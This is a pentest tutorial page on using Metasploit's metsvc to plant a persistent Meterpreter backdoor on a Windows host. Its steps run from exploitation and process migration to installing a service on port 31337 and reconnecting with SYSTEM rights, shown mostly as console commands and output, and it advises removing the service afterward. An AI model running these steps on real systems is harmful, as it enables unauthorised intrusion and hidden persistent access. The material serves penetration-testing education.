---
draft: false
title: MSF Meterpreter Backdoor
linkTitle: MSF Meterpreter Backdoor
translationKey: msf-meterpreter-backdoor
date: 2017-06-15T13:56:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: Using the metsvc service to create a backdoor with Meterpreter.
url: /msf-meterpreter-backdoor/
featured_image: /images/metasploit.jpg
categories:
    - Metasploit Framework
tags:
    - cybersecurity
    - metasploit framework
weight: 390
---
## Meterpreter metsvc

After logging into the target system, another way to ensure persistence is to use the `metsvc` service. With this service, you can open a Meterpreter session again whenever you want. You can review detailed information about [metsvc](http://www.phreedom.org/software/metsvc/) using the link.

Let's emphasize an important point you need to know about metsvc. **Anyone who finds the relevant port of the computer you placed this service on can use this backdoor.** You should cancel it after using it during pentest operations, otherwise you will open the system to malicious people. This may not be nice to the system owners.

First, let's open a meterpreter session using a module related to a vulnerability you found in the system.

```bash
msf exploit(3proxy) > exploit

> Started reverse handler
> Trying target Windows XP SP2 - English...
> Sending stage (719360 bytes)
> Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.104:1983)
```

Let's find the PID number of the `Explorer.exe` program with the `ps` command and switch to the program with this PID number with the `migrate` command.

```bash
meterpreter > ps

Process list
**============**

 PID Name Path
 --- ---- ----
 132 ctfmon.exe C:\WINDOWS\system32\ctfmon.exe
 176 svchost.exe C:\WINDOWS\system32\svchost.exe
 440 VMwareService.exe C:\Program Files\VMware\VMware Tools\VMwareService.exe
 632 Explorer.EXE C:\WINDOWS\Explorer.EXE
 796 smss.exe \SystemRoot\System32\smss.exe
 836 VMwareTray.exe C:\Program Files\VMware\VMware Tools\VMwareTray.exe
 844 VMwareUser.exe C:\Program Files\VMware\VMware Tools\VMwareUser.exe
 884 csrss.exe \??\C:\WINDOWS\system32\csrss.exe
 908 winlogon.exe \??\C:\WINDOWS\system32\winlogon.exe
 952 services.exe C:\WINDOWS\system32\services.exe
 964 lsass.exe C:\WINDOWS\system32\lsass.exe
 1120 vmacthlp.exe C:\Program Files\VMware\VMware Tools\vmacthlp.exe
 1136 svchost.exe C:\WINDOWS\system32\svchost.exe
 1236 svchost.exe C:\WINDOWS\system32\svchost.exe
 1560 alg.exe C:\WINDOWS\System32\alg.exe
 1568 WZCSLDR2.exe C:\Program Files\ANI\ANIWZCS2 Service\WZCSLDR2.exe
 1596 jusched.exe C:\Program Files\Java\jre6\binjusched.exe
 1656 msmsgs.exe C:\Program Files\Messenger\msmsgs.exe
 1748 spoolsv.exe C:\WINDOWS\system32\spoolsv.exe
 1928 jqs.exe C:\Program Files\Java\jre6\binjqs.exe
 2028 snmp.exe C:\WINDOWS\System32\snmp.exe
 2840 3proxy.exe C:\3proxy\bin3proxy.exe
 3000 mmc.exe C:\WINDOWS\system32\mmc.exe

meterpreter > migrate 632
> Migrating to 632...
> Migration completed successfully.
```

Before using the `metsvc` module, let's view the help and see what possibilities it provides us.

```bash
meterpreter > run metsvc -h
>
OPTIONS:

-A Automatically start a matching multi/handler to connect to the service
-h This help menu
-r Uninstall an existing Meterpreter service (files must be deleted manually)

meterpreter >
```

`metsvc` is a program that normally provides us with a backlink, but since we have already opened a Meterpreter session, we don't need the backlink for now. Let's just run the program.

```bash
meterpreter > run metsvc
> Creating a meterpreter service on port 31337
> Creating a temporary installation directory C:\DOCUME~1\victim\LOCALS~1\Temp\JplTpVnksh...
> > Uploading metsrv.dll...
> > Uploading metsvc-server.exe...
> > Uploading metsvc.exe...
> Starting the service...
> ***** Installing service metsvc
***** Starting service
Service metsvc successfully installed.

meterpreter >
```

`metsvc` has started and is now waiting to connect. Now let's see how we will communicate with this service.

We will use the `windows/metsvc_bind_tcp` payload module to communicate with `metsvc` which is listening on the target system. Let's activate the module as in the example below and make the necessary PORT settings.

```bash
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/metsvc_bind_tcp
PAYLOAD => windows/metsvc_bind_tcp
msf exploit(handler) > set LPORT 31337
LPORT => 31337
msf exploit(handler) > set RHOST 192.168.1.104
RHOST => 192.168.1.104
msf exploit(handler) > show options

Module options:

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
Payload options (windows/metsvc_bind_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, process
   LPORT     31337            yes       The local port
   RHOST     192.168.1.104    no        The target address
Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
msf exploit(handler) > exploit

> Starting the payload handler...
> Started bind handler
> Meterpreter session 2 opened (192.168.1.101:60840 -> 192.168.1.104:31337)
```

As you can see, `session 2` has been opened automatically. Now, let's see what PID number the `metsvc` service is running with on the target computer.

```bash
meterpreter > ps

Process list
**============**

   PID   Name               Path                                                  
   ---   ----               ----                                                  
   140   smss.exe           \SystemRoot\System32\smss.exe                         
   168   csrss.exe          \??\C:\WINNT\system32\csrss.exe                       
   188   winlogon.exe       \??\C:WINNT\system32\winlogon.exe                    
   216   services.exe       C:\WINNT\system32\services.exe                        
   228   lsass.exe          C:\WINNT\system32\lsass.exe                           
   380   svchost.exe        C:\WINNT\system32\svchost.exe                         
   408   spoolsv.exe        C:\WINNT\system32\spoolsv.exe                         
   444   svchost.exe        C:\WINNT\System32\svchost.exe                         
   480   regsvc.exe         C:\WINNT\system32\regsvc.exe                          
   500   MSTask.exe         C:\WINNT\system32\MSTask.exe                          
   528   VMwareService.exe  C:\Program Files\VMware\VMware Tools\VMwareService.exe
   564   metsvc.exe         c:\WINNT\my\metsvc.exe                                
   588   WinMgmt.exe        C:\WINNT\System32\WBEM\WinMgmt.exe                    
   676   cmd.exe            C:\WINNT\System32\cmd.exe                             
   724   cmd.exe            C:\WINNT\System32\cmd.exe                             
   764   mmc.exe            C:\WINNT\system32\mmc.exe                             
   816   metsvc-server.exe  c:\WINNT\my\metsvc-server.exe                         
   888   VMwareTray.exe     C:\Program Files\VMware\VMware Tools\VMwareTray.exe   
   896   VMwareUser.exe     C:\Program Files\VMware\VMware Tools\VMwareUser.exe   
   940   firefox.exe        C:\Program Files\Mozilla Firefox\firefox.exe          
   972   TPAutoConnSvc.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
   1000  Explorer.exe       C:\WINNT\Explorer.exe                                 
   1088  TPAutoConnect.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe

meterpreter > pwd
C:\WINDOWS\system32
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

As can be seen from the output, the `metsvc` program is running with PID number 564. Now, whenever you want, we can connect to the program listening on the target computer using the `windows/metsvc_bind_tcp` payload module.

Again, once your security test procedures are complete, you should delete the `metsvc` program from the system.